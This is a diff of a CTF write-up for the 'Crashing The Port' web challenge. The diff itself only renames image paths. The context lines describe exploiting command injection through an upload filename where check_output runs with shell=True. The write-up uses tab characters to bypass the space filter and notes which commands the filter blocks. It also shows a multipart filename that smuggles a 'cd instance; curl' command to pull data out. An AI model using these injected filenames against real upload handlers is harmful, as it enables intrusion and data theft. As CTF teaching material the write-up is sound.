@@ -8,7 +8,7 @@ Upload your customs and my python script will detect the price 😎.
 
 Main page presents Filling a form, but we are soon redirected to `/login`
 
-![Crashing The Port.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port.png)
+![Crashing The Port.png](/assets/ctf/idex.ctf.ae/crashing-the-port.png)
 
 Since we don't have an account we can `/register`
 
@@ -16,7 +16,7 @@ Since we don't have an account we can `/register`
 
 I uploaded a random  file and it just says Checking file
 
-![Crashing The Port-1.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-1.png)
+![Crashing The Port-1.png](/assets/ctf/idex.ctf.ae/crashing-the-port-1.png)
 
 `/uploads/t2.py` path doesn't exist
 
@@ -27,27 +27,27 @@ Injecting XSS into all fields and attaching HTML with XSS payload also yielded n
 
 We can visit `/shipments` to view our *Shipments*
 
-![Crashing The Port-2.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-2.png)
+![Crashing The Port-2.png](/assets/ctf/idex.ctf.ae/crashing-the-port-2.png)
 
 When fuzzing for SSTI I replaced filename and it responded with `Noooo`
 
-![Crashing The Port-3.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-3.png)
+![Crashing The Port-3.png](/assets/ctf/idex.ctf.ae/crashing-the-port-3.png)
 
 It doesn't like `{}` characters in filename, yet it's still uploaded (?)
 
 Changing filename to just single quote crashes the application and reveals some backend code.
 
-![Crashing The Port-4.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-4.png)
+![Crashing The Port-4.png](/assets/ctf/idex.ctf.ae/crashing-the-port-4.png)
 
 Because `check_output` has `shell=True` this means we get free RCE, any bash like commands can be ran here.
 
-![Crashing The Port-5.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-5.png)
+![Crashing The Port-5.png](/assets/ctf/idex.ctf.ae/crashing-the-port-5.png)
 
 Filename has few noticeable restrictions: first no spaces are allowed, we could have used `${IFS}` or `$IFS` as alternative space but nothing.
 
 Tab character (`\t`) can be used as alternative space.
 
-![Crashing The Port-6.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-6.png)
+![Crashing The Port-6.png](/assets/ctf/idex.ctf.ae/crashing-the-port-6.png)
 
 For me the easiest way to inject characters into burp is to Base64 encode and then decode with **Ctrl+Shift+B**
 ```bash
@@ -57,7 +57,7 @@ CQo=
 
 Anyway, no flag in sight; but there's a database?
 
-![Crashing The Port-7.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-7.png)
+![Crashing The Port-7.png](/assets/ctf/idex.ctf.ae/crashing-the-port-7.png)
 
 I was able to bypass the `/` checks by using `cd`
 ```http
@@ -66,7 +66,7 @@ Content-Disposition: form-data; name="file"; filename="temp;cd	instance	;curl	uw
 
 Exfiltration was pointless 😭
 
-![Crashing The Port-8.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-8.png)
+![Crashing The Port-8.png](/assets/ctf/idex.ctf.ae/crashing-the-port-8.png)
 
 Also `cat` is blocked, `rev` too, but not `tac` or `base32` (64 is blocked)
 
@@ -145,7 +145,7 @@ Now that I have proper LFI we need to A: find the flag or B: get RCE. We can get
 
 Console path doesn't work so I guess it's out of the question...
 
-![Crashing The Port-9.png](/assets/ctf/idex.ctf.ae/2025/web/Crashing The Port-9.png)
+![Crashing The Port-9.png](/assets/ctf/idex.ctf.ae/crashing-the-port-9.png)
 
 CTF ended and it turns out flag was in fucking ENV 😐
 
